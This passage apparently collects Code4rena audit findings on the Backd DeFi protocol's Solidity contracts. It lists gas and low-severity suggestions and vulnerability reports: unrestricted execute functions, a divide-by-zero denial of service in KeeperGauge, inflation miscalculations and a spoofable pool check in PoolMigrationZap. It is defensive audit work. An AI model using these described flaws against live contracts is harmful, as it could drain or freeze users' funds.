Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:82:        require(!initializedSupply, "Supply already initialized once"); tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); tokenomics/VestedEscrow.sol:90:        require(msg.sender == fundAdmin || msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrow.sol:91:        require(initializedSupply, "Supply must be initialized"); tokenomics/VestedEscrowRevocable.sol:52:        require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); tokenomics/VestedEscrowRevocable.sol:53:        require(revokedTime[_recipient] == 0, "Recipient already revoked"); tokenomics/VestedEscrowRevocable.sol:54:        require(_recipient != treasury, "Treasury cannot be revoked!"); utils/Preparable.sol:28:        require(deadlines[key] == 0, Error.DEADLINE_NOT_ZERO); utils/Preparable.sol:29:        require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT); utils/Preparable.sol:86:        require(deadlines[key] != 0, Error.NOTHING_PENDING); utils/Preparable.sol:98:        require(deadlines[key] != 0, Error.NOTHING_PENDING); utils/Preparable.sol:110:        require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED); utils/Preparable.sol:111:        require(deadline != 0, Error.DEADLINE_NOT_SET); zaps/PoolMigrationZap.sol:56:        require(lpTokenAmount_ != 0, "No LP Tokens"); zaps/PoolMigrationZap.sol:57:        require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); AddressProvider.sol:64:        require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED); AddressProvider.sol:71:        require(_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_NOT_WHITELISTED); AddressProvider.sol:98:        require(pool != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:102:        require(poolToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:176:        require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:185:        require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:199:        require(exists, Error.ADDRESS_DOES_NOT_EXIST); AddressProvider.sol:241:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:242:        require(meta.freezable, Error.INVALID_ARGUMENT); AddressProvider.sol:260:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:270:        require(!meta.frozen, Error.ADDRESS_FROZEN); AddressProvider.sol:295:        require(token != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); AddressProvider.sol:296:        require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS); AddressProvider.sol:325:        require(exists, Error.ADDRESS_NOT_FOUND); AddressProvider.sol:428:        require(!_addressKeyMetas.contains(key), Error.INVALID_ARGUMENT); AddressProvider.sol:434:        require(_addressKeyMetas.set(key, meta.toUInt()), Error.INVALID_ARGUMENT); BkdLocker.sol:59:        require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED); BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); BkdLocker.sol:119:        require( BkdLocker.sol:137:        require(length > 0, "No entries"); BkdLocker.sol:208:        require( Controller.sol:34:        require(address(inflationManager) == address(0), Error.ADDRESS_ALREADY_SET); Controller.sol:35:        require(_inflationManager != address(0), Error.INVALID_ARGUMENT); Controller.sol:82:        require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); CvxCrvRewardsLocker.sol:87:        require( CvxCrvRewardsLocker.sol:152:        require(_treasury != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); CvxCrvRewardsLocker.sol:195:        require(delegate != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); GasBank.sol:29:        require(account != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); GasBank.sol:46:        require(currentBalance != 0, Error.INSUFFICIENT_BALANCE); GasBank.sol:47:        require( GasBank.sol:73:        require(currentBalance >= amount, Error.NOT_ENOUGH_FUNDS); GasBank.sol:74:        require( GasBank.sol:81:            require(currentBalance - amount >= ethRequired, Error.NOT_ENOUGH_FUNDS); GasBank.sol:96:        require(success, Error.FAILED_TRANSFER); LpToken.sol:22:        require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); LpToken.sol:34:        require(_minter != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); StakerVault.sol:66:        require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); StakerVault.sol:76:        require(currentAddresses[_LP_GAUGE] == address(0), Error.ROLE_EXISTS); StakerVault.sol:99:        require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS); StakerVault.sol:112:        require(msg.sender != account, Error.SELF_TRANSFER_NOT_ALLOWED); StakerVault.sol:113:        require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); StakerVault.sol:145:        require(src != dst, Error.SAME_ADDRESS_NOT_ALLOWED); StakerVault.sol:154:        require(startingAllowance >= amount, Error.INSUFFICIENT_ALLOWANCE); StakerVault.sol:157:        require(srcTokens >= amount, Error.INSUFFICIENT_BALANCE); StakerVault.sol:202:        require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS); StakerVault.sol:223:        require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS); StakerVault.sol:323:        require(IERC20(token).balanceOf(msg.sender) >= amount, Error.INSUFFICIENT_BALANCE); StakerVault.sol:339:        require(staked == amount, Error.INVALID_AMOUNT); StakerVault.sol:366:        require( StakerVault.sol:370:        require(balances[src] >= amount, Error.INSUFFICIENT_BALANCE); ``` 
G-1 COMPARISONS WITH ZERO FOR UNSIGNED INTEGERS `>0` is less gas efficient than `!0` only if you enable optimizer and you're in a require statement.  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=require(amount%20%3E%200%2C%20Error.INVALID_AMOUNT)%3B  G-2 An length should be cached to save gas in for-loops Some of the for-loops in other contracts already have been doing this but the one below hasn't. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/StakerVault.sol#:~:text=for%20(uint256%20i%3B%20i%20%3C%20actions.length%3B%20i%20%3D%20i.uncheckedInc())%20%7B   
L-1 Maybe should have address(0) checks to avoid having to redeploy contracts https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=rewardToken%20%3D%20_rewardToken%3B  L-2 Missing checks for address when assigning values to address state variables https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=rewardToken%20%3D%20newRewardToken%3B  N-1 Multiple `addresss` mapping can be combined into a single mapping of an address to a struct. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol#:~:text=mapping(address,)%20public%20totalStashed%3B  N-2 Emit an event in setInflationRecipient()  The `setInflationRecipient()` function is operated only by the governerance and should emit an event when the inflationrecipient is set for the first time or changes. https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmConvexGauge.sol#:~:text=function%20setInflationRecipient(,%7D  
- `PoolMigrationZap.sol` - Use `UncheckedMath.uncheckedInc `instead of [++i in loop](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22)  - `FeeBurner.sol` - Use `calldata` instead of `memory` for read-only function argument array [`tokens_`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L43).
**Redundant greater than 0 checks for uint** When executing pool weight changes in `InflationManager.sol` ([_executeKeeperPoolWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L575), [_executeLpPoolWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L589), [_executeAmmTokenWeight](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L602)), corresponding total pool weights `x` are `unsigned int`. As they can't only be `x >= 0`, the expression `x>0 ? x : 0` does nothing.   **Sensible changes, such as adding a Governor should be a two-step process** [`addGovernance`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L41) directly grants `Roles.GOVERNANCE` to the `newGovernor`. It should be a two-step process (*e.g. [setGovernance](https://docs.yearn.finance/vaults/0.4.2/smart-contracts/registry#setgovernance)-[acceptGovernance](https://docs.yearn.finance/vaults/0.4.2/smart-contracts/registry#acceptgovernance)*) to ensure the input address is correct. Whilst `renounceGovernance` checks that there is at least one Governor left, in a single-Governor scenario, back to back execution of `addGovernance` with an incorrect address followed by `renounceGovernance` will render the protocol ungovernable. Additionally, as there is no way to revoke this role, granting governance to an address means that address will have complete control over the protocol forever after.  **Requirement uses external call to user-controlled address in [`PoolMigrationZap.sol - migrate`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52)** `require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0");` makes an external call to `oldPoolAddress_`, which is a user-controlled address. It could be a malicious contract, thus reporting any result needed to bypass the guard.  **Erring on the safe side for reentrancy in [`PoolMigrationZap.sol - migrate`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L52)** While I did not manage to exploit it in any way - I'd recommend against not including a `nonReentrant` guard in this function. `oldPoolAddress_` could be a malicious contract thus enabling multiple calls to `migrate` spanning from the external calls to `oldPool` or `lpToken_`.   **Recommended missing events** Modifying key protocol variables or triggering key events should always emit events accordingly to ensure transparency and proper traceability.  - [`Minter.sol`]( https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/Minter.sol): *setToken, startInflation,  executeInflationRateUpdate* - [`BkdLocker.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/BkdLocker.sol): *migrate* - [`Controller.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol): *setInflationManager* - [`AmmGauge.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol): *kill* - [`KeeperGauge.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/KeeperGauge.sol): *kill, advanceEpoch, reportFees, poolCheckpoint* - [`InflationManager.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol): *deactivateWeightBasedKeeperDistribution, checkpointAllGauges* - [`VestedEscrow.sol`](https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol): *setAdmin, setFundAdmin, initializeUnallocatedSupply*
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L145-L155 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L236-L249 https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L321-L330   # Vulnerability details  ## Impact  Several actions need to be prepared and go through a time-lock before they can be executed. `InflationManager` allows anyone to call the single action execute function but requires `onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)` for the batched versions. This looks like an oversight since the same access control level should be enforced.  For example, the `executeLpPoolWeight` function allows anyone to call it:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L241-L249  ``` function executeLpPoolWeight(address lpToken) external override returns (uint256) {    (...) } ```   But the batched version enforces the caller to have `GOVERNANCE` or `INFLATION_MANAGER` roles:  https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L284-L301  ``` function batchExecuteLpPoolWeights(address[] calldata lpTokens)         external         override         onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)         returns (bool)     { ```  The same happens in `executeAmmTokenWeight` versus `batchExecuteAmmTokenWeights` , as well as `executeKeeperPoolWeight` versus `batchExecuteKeeperPoolWeights`.  If only trusted roles should be able to execute pending actions then the `onlyRoles` modifier should be added to the non-batched functions.  Scenarios where you would not want to allow anyone to execute could include potential votes/changes that may trigger a bug or undesired behavior noticed after it had already been approved.  ## Tools Used  vim  ## Recommended Mitigation Steps  Enforce the proper access control mechanism in non-batched execute functions.  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L157-L161   # Vulnerability details  ## Impact When the Gauge is killed, the advanceEpoch and kill functions can still be called to make epoch+1, while the reportFees function cannot be called to update the value of perPeriodTotalFees, which will cause perPeriodTotalFees[epoch] == 0. Later if the user calls the claimRewards function, the default epoch parameter will cause a divide by zero crash in the code below. ```` for (uint256 i = startEpoch; i < endEpoch; i = i.uncheckedInc()) {              totalClaimable += (                  keeperRecords[beneficiary].feesInPeriod[i].scaledDiv(perPeriodTotalFees[i])              ).scaledMul(perPeriodTotalInflation[i]);          } ```` ## Proof of Concept https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L157-L161 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L96-L100 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L57-L62 ## Tools Used None ## Recommended Mitigation Steps Require killed to be false in poolCheckpoint function ```     function poolCheckpoint() public override returns (bool) { -       if (killed) return false; +      require(!killed);         uint256 timeElapsed = block.timestamp - uint256(lastUpdated);         uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);         perPeriodTotalInflation[epoch] += currentRate * timeElapsed;         lastUpdated = uint48(block.timestamp);         return true;     } ```  
## [Non-critical - 01] - In `Minter`, `currentInflationAmountLp`, `currentInflationAmountKeeper`, `currentInflationAmountAmm` could be made internal.  There are getters like `getLpInflationRate` for these variables, so there is no need to make them public as it just creates duplicates view functions.  
## [Gas - 01] - `Gauges` could mint directly to `Minter` Currently all mint action pass through the `InflationManager` which checks the access control using the mapping `gauges` and then forward the call to the `Minter`: see [this code](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L78). It would be way more gas efficient considering the frequency of mints versus `gauges` mapping updates to maintain identical mappings in `InflationManager` and `Minter` and to mint directly to `Minter`.  This would just imply using an internal function in `InflationManager` to make sure each time `gauges` is updated it is also updated in `Minter`.   ## [Gas - 02] - In `Minter`, `token` could be made immutable  In [`Minter`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L55), `token` is not immutable but can only be set once. I assume this is for simplicity as you want to deploy `Minter`, `BkdToken` and then set the address of `BkdToken` in `Minter`. But this overhead could easily be avoided by pre-computing the deployment address of `BkdToken` so it could be set in the constructor of `Minter` and be immutable. This would save a lot of gas during the whole contract lifecycle.  To precompute deployment addresses, you can use the CREATE2 opcode: check https://docs.openzeppelin.com/cli/2.8/deploying-with-create2 or https://medium.com/coinmonks/pre-compute-contract-deployment-address-using-create2-8c01e80ab7da.  This also applies to other places in the code like https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L56   ## [Gas - 03] - In `Minter`, `currentInflationAmountLp`, `currentInflationAmountKeeper`, `currentInflationAmountAmm` could be made internal. There are getters like `getLpInflationRate` for these variables, so there is no need to make them public as it just creates duplicates view functions.   ## [Gas - 04] - `Minter` and `BkdToken` could be merged  To save expensive external calls, why not merging `Minter` and `BkdToken` into a single contract ? I think it doable from a contract size point of view, and references to one another are immutable so it would totally make sense to merge them.   ## [Gas - 05] In `VestedEscrow`, `totalTime` could be made immutable. [`totalTime`](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L39) is not changed during the contract lifetime so could be made immutable !   ## [Gas - 06] In `Minter`, there is no need to inherit `ReentrancyGuard` In `Minter` the keyword `nonReentrant` is used only once [here](https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L129), but it is useless as there is only an external call to a trusted contract: the token, and no crucial states updates after this call. 
# Lines of code   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L220  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L559  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L572  https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L586   # Vulnerability details   ## Impact  When updating pool inflation rates, other pools see their `currentRate` being modified without having `poolCheckpoint` called, which leads to false computations.  This will lead to either users losing a part of their claims, but can also lead to too many tokens could be distributed, preventing some users from claiming due to the `totalAvailableToNow` requirement in `Minter`.  ## Proof of concept  Imagine you have 2 AMM pools A and B, both with an `ammPoolWeight` of 100, where `poolCheckpoint` has not been called for a moment. Then, imagine calling [`executeAmmTokenWeight`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L318) to reduce the weight of A to 0.   Only A is checkpointed [here](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/InflationManager.sol#L591), so when B will be checkpointed it will call `getAmmRateForToken`, which will see a pool weight of 100 and a total weight of 100 over the whole period since the last checkpoint of B, which is false, therefore it will distribute too many tokens. This is critical has the minter expects an exact or lower than expected distribution due to the requirement of `totalAvailableToNow`.  In the opposite direction, when increasing weights, it will lead to less tokens being distributed in some pools than planned, leading to a loss for users.  ## Mitigation steps Checkpoint every `LpStakerVault`, `KeeperGauge` or `AmmGauge` when updating the weights of one of them.    
# Lines of code   https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181   # Vulnerability details  ## Impact The actual total supply of the token is random and depends on when `_executeInflationRateUpdate` is executed.  ## Proof of concept The `README` and tokenomic documentation clearly states that “The token supply is limited to a total of 268435456 tokens.”. However when executing [`_executeInflationRateUpdate`](https://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/tokenomics/Minter.sol#L181), it first uses the current inflation rate to update the total available before checking if it needs to be reduced.   Therefore if no one mints or calls `executeInflationRateUpdate` for some time around the decay point, the inflation will be updated using the previous rate so the  `totalAvailableToNow` will grow too much.  ## Mitigation steps  You should do ```js  totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent)); ```  Only if the condition `block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD` is false.   Otherwise you should do   ```js  totalAvailableToNow += (currentTotalInflation * (lastInflationDecay + _INFLATION_DECAY_PERIOD - lastEvent));  ```  Then update the rates, then complete with ```js  totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastInflationDecay + _INFLATION_DECAY_PERIOD));  ```  Note that as all these variables are either constants either already loaded in memory this is super cheap to do.   
# Report  * [Low](#low)   * [L-01: use two-step process for critical address changes](#l-01-use-two-step-process-for-critical-address-changes) * [Non-Critical](#non-critical)   * [N-01: emit an event when changing the configuration of a contract](#n-01-emit-an-event-when-changing-the-configuration-of-a-contract)   * [N-02: AmmGauge doesn't use correct value for staking/unstaking events](#n-02-ammgauge-doesnt-use-correct-value-for-stakingunstaking-events)  # Low  ## L-01: use two-step process for critical address changes  Consider using a two-step process for transferring the ownership of a contract. While it costs a little more gas, it's safer than transferring directly.  Here's an example from the Compound Timelock contract: https://github.com/compound-finance/compound-protocol/blob/master/contracts/Timelock.sol#L45-L58  Relevant code sections: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68  # Non-Critical  ## N-01: emit an event when changing the configuration of a contract  There are multiple configuration functions that don't emit an event.  Relevant code: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L68 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/VestedEscrow.sol#L74 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/InflationManager.sol#L58 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/Controller.sol#L33  There're probably a couple more that I missed  ## N-02: AmmGauge doesn't use correct value for staking/unstaking events  The functions verify the number of tokens that were transferred. The value is used to keep track of the internal balances. But, it isn't used for the event. There you use the user specified `amount` parameter:  ```sol function stakeFor(address account, uint256 amount) public virtual override returns (bool) {     require(amount > 0, Error.INVALID_AMOUNT);      _userCheckpoint(account);      uint256 oldBal = IERC20(ammToken).balanceOf(address(this));     IERC20(ammToken).safeTransferFrom(msg.sender, address(this), amount);     uint256 newBal = IERC20(ammToken).balanceOf(address(this));     uint256 staked = newBal - oldBal;     balances[account] += staked;     totalStaked += staked;          // should be `staked` and not `amount`     emit AmmStaked(account, ammToken, amount);     return true; } ```  Relevant code: - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L114 - https://github.com/code-423n4/2022-05-backd/blob/main/protocol/contracts/tokenomics/AmmGauge.sol#L136
# Parameter validation is lacking zero-address check  ## Details Some of the function does not check for zero-address see reference: https://github.com/code-423n4/2021-06-pooltogether-findings/issues/81  # Mitigation check for zero-address input  # affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L117-L129 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L158-L170 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L253-L262 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L423-L436 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L70-L75 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L109-L111 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L227-L232 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L292-L336 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L71-L73 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L197-L210 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L218-L235 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L322-L349 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L359-L398 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L400-L402
# Solidity compiler will always read the length of the array during each iteration ## Details .length in a loop can be extracted into a variable and used where necessary to reduce the number of storage reads see reference: https://github.com/code-423n4/2021-10-union-findings/issues/92 ## Mitigation: This extra costs can be avoided by caching the array length.  Example: `uint rolesLength = roles.length;` `for (uint j = 0; i < rolesLength; ++j { }` ## affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L39  # `!=` is cheaper in gas compared to `>` for uint ## Details `!= 0` costs less gas compared to `> 0` for unsigned integers in require statements with the optimizer enabled (6 gas) see reference: https://github.com/code-423n4/2021-12-maple-findings/issues/75 ## Mitigation use `!= 0` instead of `> 0` ### affected codes: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91-L92 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L137 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  # Pre-increment cost less gas than post-increment ## Details `epoch++` costs more gas than `++epoch` , for uint pre-decrement is cheaper than post-decrement see reference: https://github.com/code-423n4/2021-12-nftx-findings/issues/195 ## Mitigation change `epoch++` to `++epoch` ### Affected code: https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L59 https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L98
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L151-L164   # Vulnerability details  ## Impact In the **_calcTotalClaimable()** function it should be validated that perPeriodTotalFees[i] != 0 since otherwise it would generate a DoS in **claimableRewards()** and **claimRewards()**. This would be possible since if **advanceEpoch()** or **kill()** is executed by the InflationManager address, the epoch will go up without perPeriodTotalFees[newIndexEpoch] is 0. The negative of this is that every time the **InflationManager** executes these two methods (**kill() and advanceEpoch()**) DoS is generated until you run **reportFees()**. Another possible case is that **kill()** or **advanceEpoch()** are executed 2 times in a row and there is no way of a perPeriodTotalFees[epoch-1] updating its value, therefore it would be an irreversible DoS.  ## Recommended Mitigation Steps Generate a behavior for the case that perPeriodTotalFees[i] == 0.   
 **AddressProvider.sol** - L93/117 - It is validated that pool != address(0) but actually pool is needed to put it inside the ILiquidityPool interface, therefore, the best thing would be to request the interface directly in the signature, like this: addPool(ILiquidityPool pool) and removePool(ILiquidityPool pool). In this way, it would be avoided to validate that pool != address(0), since address(0) does not comply with the ILiquidityPool interface.  - L288 - An address is requested in the addStakerVault() function and as soon as the function starts it is put inside the IStakerVault interface, therefore, the best would be to request the interface directly in the signature, like this: addStakerVault(IStakerVault stakerVault). This way it would avoid starting to execute inside the function.  **Controller.sol** - L33 - The setInflationManager() function performs two validations, the second would not be necessary if an IInflationManager is requested directly in the signature (as is done in the constructor). This would also have the benefit of not being wrapear on line 36.  - L39 - The addStakerVault() function has as its first validation, return false if this validation is true (!addressProvider.addStakerVault(stakerVault)), The problem with this validation is that in the implementation of AddressProvider it never returns false, therefore the validation is not necessary (it is also immutable, therefore it can only be modified in the deploy).  - L121/123/127/129 - The code of the function getTotalEthRequiredForGas() would be much cleaner if the signature contains the creation of the variable (returns (uint256 totalEthRequired)), in this way the creation of the variable in line 123 and the final return would be avoided.  **contracts/zaps/PoolMigrationZap.sol** - L24/25 - If when executing: newPool_.getUnderlying(), we get address(0) as response, it should not be correct to set _underlyingNewPools[address(0)] and this is currently happening. The validation of line 26: if (underlying_ == address(0)) continue; it should be earlier.  **contracts/BkdLocker.sol** - L188 - It is not validated in the getShareOfTotalBoostedBalance() function that when the division is performed with totalLockedBoosted, totalLockedBoosted is != 0.  **contracts/tokenomics/FeeBurner.sol** - L25 - The WETH address is hardcoded, this implies that this code is only usable in a single network. If it's on 